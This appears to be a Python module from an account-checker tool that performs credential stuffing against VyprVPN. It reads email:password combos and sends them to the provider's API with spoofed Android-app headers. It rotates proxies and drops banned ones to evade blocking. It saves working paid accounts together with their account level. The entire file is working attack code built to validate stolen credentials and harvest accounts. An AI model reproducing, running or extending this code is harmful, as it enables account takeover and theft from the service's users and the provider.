from checkolotl.utils.proxy import get_proxy, remove_proxy
from checkolotl.settings import settings
from checkolotl.saver import save

import base64
import time
from datetime import datetime
import requests
import urllib


def check(combo):
    email, password = combo.split(":", 1)
    header = {
        'User-Agent': "okhttp/3.8.1",
        'contentType': "application/json",
        'X-API-Version': "2",
        'X-API-Features': "partial_sign_up;",
        'X-GF-PRODUCT': "VyprVPN",
        'X-GF-PRODUCT-VERSION': "2.29.0.10068",
        'X-GF-PLATFORM': "Android",
        'X-GF-PLATFORM-VERSION': "7.1.2",
        'locale': "en_UK",
        'X-GF-Agent': "VyprVPN Android v2.29.0.10068. (aceeaa1f)",
        'username': str(email),
        'password': str(password),
        'accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
        'https': "//www.vyprvpn.com/login:",
        'Accept': "*/*",
        'Cache-Control': "no-cache",
        'Host': "api.goldenfrog.com",
        'accept-encoding': "gzip, deflate",
        'Connection': "keep-alive",
        'cache-control': "no-cache"
    }
    proxies_to_ban = []
    for i in range(settings.checkers.vyprvpn.check_amount):
        proxy = get_proxy("vyprvpn")
        proxy_dict = {
            "http": proxy,
            "https": proxy
        }
        try:
            r = requests.get(url="https://api.goldenfrog.com/settings",
                              headers=header,
                              timeout=settings.checkers.vyprvpn.timeout,
                              proxies=proxy_dict)
        except:
            if settings.checkers.vyprvpn.remove_banned_proxy:
                proxies_to_ban.append(proxy)
            continue
        if r.status_code == 200:
            paid = r.json().get("vpn")
            if paid and not paid.get("locked"):
                rank = paid.get("account_level")

                replace_dict = {
                    "rank": str(rank),
                    "email": email,
                    "password": password
                }
                account = str(settings.checkers.vyprvpn.account_format).format(**replace_dict)
                save("vyprvpn", account)
            for proxy in proxies_to_ban:
                remove_proxy("vyprvpn", proxy)
            return
        elif r.status_code == 403:
            return
        else:
            if settings.checkers.vyprvpn.remove_banned_proxy:
                proxies_to_ban.append(proxy)
            continue
